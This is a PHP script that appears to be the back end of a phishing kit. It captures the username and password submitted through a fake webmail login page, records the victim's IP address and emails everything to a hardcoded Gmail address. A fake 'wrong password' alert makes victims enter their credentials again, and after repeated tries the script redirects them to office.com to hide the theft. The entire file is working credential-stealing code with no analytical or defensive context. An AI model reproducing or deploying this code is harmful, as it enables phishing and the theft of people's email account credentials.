<?php

$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "webmail Result"."\n";
$message .= "User : ".$_POST['user']."\n";
$message .= "Password: " .$_POST['pass']."\n";
$try.= $_POST['try']+1;
$a = "index3.php?life=".$_POST['user']."&try=".$try;
$message .= "IP: ".$ip."\n";

$domain = substr($_POST['user'], strpos($_POST['user'], '@') + 1);
mail($recipient,$subject,$message);

$recipient = "ritaconnor346@gmail.com";
$subject = "Result!!!";
$headers = "From: webmail <mofiz@banglamail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$subject,$message,$headers))

{ 
	if($try<=2) {     
	
		   echo "<script type='text/javascript'>alert('Wrong password. Please try again');
		   window.location='$a';
		   </script>";
}
	else {
		?>

		   <script language=javascript>
window.location="https://office.com";
</script>
<?
	}

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>